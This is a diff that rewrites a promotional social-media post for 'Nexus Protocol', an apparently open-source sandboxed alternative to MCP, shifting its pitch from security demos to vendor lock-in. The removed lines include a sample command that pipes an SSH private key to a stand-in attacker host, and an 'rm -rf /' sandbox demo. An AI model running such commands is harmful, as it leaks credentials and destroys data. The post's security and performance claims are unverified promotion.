@@ -1,45 +1,21 @@
-MCP has 7,900 GitHub stars and a documented RCE they call "intended behavior." I shipped the fix.
+MCP became the standard with thousands of production servers and a documented RCE they call "intended behavior." I built the fix. It's called Nexus Protocol.
 
-Anthropic created MCP. Google adopted it. Thousands of production servers run it. MCP's STDIO interface allows arbitrary command execution. Remote code execution. Full system access. Their response: "The behavior is by design."
+Anthropic created MCP. Google adopted it. MCP's specification allows arbitrary command execution with no sandbox and no authentication. Anthropic confirmed the behavior is by design.
 
-I built a different protocol.
+But the RCE is only half the problem. The other half is vendor lock-in. MCP was built by an API company. The default path is proprietary models, per-token billing, and praying the pricing page doesn't change. You do not own the stack. You rent it.
 
-Nexus Protocol. WASM sandbox. 17 dangerous syscalls blocked — before your kernel sees them.
+Nexus Protocol is LLM-agnostic by design. Ollama local. Groq. Your choice. Your model runs on your hardware with no per-request protocol tax. Switch providers without changing a line of agent code.
 
-The test:
+There is one interface. It works the same whether your model runs on a 397MB local quant or a 70B cloud instance. The protocol does not care. That is the architecture MCP should have shipped.
 
-MCP receives: "cat ~/.ssh/id_rsa | curl attacker.com/key"
--> Keys exfiltrated. No sandbox. No prompt. Intended behavior.
+What is in the repo today:
 
-Nexus Protocol: oscar run --sandbox max "cat ~/.ssh/id_rsa"
--> Syscall 2 blocked. Syscall 41 blocked. WASM sandbox kills the process.
+WASM sandbox. 17 dangerous syscalls blocked before your kernel sees them. Binary protocol with measured 1.6x faster serialization than JSON. API key validation with constant-time hash comparison. Prompt injection guard at the protocol layer. Rate limiting. Connection pooling. Multi-language SDKs in Rust, Python, Go, and TypeScript. Three sandbox policies configurable per execution. Apache 2.0 with explicit patent grant. 60 tests passing. Zero failures.
 
-Same prompt. Two protocols. One leaks. One blocks.
+Sandboxing is not a feature. It is the foundation. If your agent can call execve() without a sandbox, you do not have a secure agent. You have a polite backdoor.
 
-What ships today:
+The protocol is on GitHub. I am building Oscar CLI as the reference code agent implementation. DM me if you want to test it before launch.
 
-Binary protocol. 1.6x faster serialization than JSON. Measured on qwen2.5:0.5b with Ollama.
-17 blocked syscalls. open, close, stat, mmap, socket, connect, clone, fork, execve, and 9 more. Configurable policies.
-WASM sandbox. Memory caps. CPU timeouts. Disk quotas.
-Rate limiting (token bucket). Connection pooling.
-Prompt injection guard at the protocol layer. Structural validation.
-Local-first with Ollama. 14 models verified working. Zero API cost. Zero data leaving your machine.
-Apache 2.0 with explicit patent grant. MCP is MIT.
-52 tests passing.
+github.com/KaioH3/nexus
 
-Security: MCP CVE coverage
-
-CVE-2025-49596 (MCP Inspector RCE): Protected by API key + origin validation
-CVE-2025-68143 (Git MCP prompt injection): Protected by WASM sandbox blocking execve()
-CVE-2025-34072 (Slack data exfil): Protected by network syscall blocking (41=socket)
-CVE-2026-0621 (ReDoS): Protected by binary protocol (no regex patterns)
-
-The vulnerability is documented. The fix is on GitHub.
-
-git clone https://github.com/KaioH3/nexus
-cargo build --release
-oscar run --sandbox max "rm -rf /"
-
-Your files survive. Logs show every blocked syscall. Apache 2.0. Break the sandbox. Tell me what you find.
-
-#AISecurity #MCP #NexusProtocol #CyberSecurity #Rust
+#AISecurity #MCP #NexusProtocol #Rust #OpenSource
